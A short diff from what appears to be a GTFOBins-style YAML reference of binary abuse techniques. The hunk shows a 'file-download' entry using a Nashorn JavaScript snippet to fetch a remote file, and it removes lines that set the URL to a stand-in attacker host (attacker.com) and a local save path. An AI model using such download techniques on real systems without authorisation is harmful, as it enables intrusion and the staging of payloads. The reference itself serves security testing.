@@ -4,8 +4,6 @@ functions:
   file-download:
     - description: Fetch a remote file via HTTP GET request.
       code: |
-        export URL=http://attacker.com/file_to_get
-        export LFILE=file_to_save
         echo "var URL = Java.type('java.net.URL');
         var ws = new URL('$URL');
         var Channels = Java.type('java.nio.channels.Channels');
